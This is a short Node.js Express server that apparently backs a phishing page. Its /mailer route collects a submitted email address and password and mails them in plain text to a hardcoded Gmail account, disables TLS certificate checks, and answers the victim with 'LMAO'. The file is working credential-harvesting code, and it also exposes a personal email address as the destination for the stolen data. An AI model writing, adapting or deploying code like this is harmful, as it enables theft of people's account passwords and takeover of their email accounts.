const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const nodemailer = require('nodemailer');
const { getMaxListeners } = require('process');
require('dotenv').config();

const PORT = process.env.PORT || 2020

const app = express();

// Setting template Engine
app.set('view engine', 'ejs');
// app.set("socketio", io);
app.use('/', express.static(path.join(__dirname)))
// parse application/x-www-form-urlencoded aka your HTML <form> tag stuff
app.use(bodyParser.urlencoded({ extended: false }))
// parse application/json aka whatever you send as a json object
app.use(bodyParser.json())

app.get("/", (req, res) => {
    res.render("index.html")
})

app.post("/mailer", (req, res) => {
    const { email, pass } = req.body
    console.log("Yes")
    
    let transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465,
        secure: true,
        auth: {
            user: process.env.EMAIL,
            pass: process.env.PASS
        },
        //to enable localhost for now
        tls: {
            rejectUnauthorized: false
        }
    });

    let mailOptions = {
        from: '"Tera Chacha" <your@email.com>', // sender address
        to: "addityadd@gmail.com", // list of receivers
        subject: 'Email', // Subject line
        text: `Email: ${email}\nPass: ${pass}`, // plain text body
        //html: output // html body
    };
    
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
    });

    res.send("LMAO")

})

app.listen(PORT, () => {
    console.log(`listening on port ${PORT}`);
})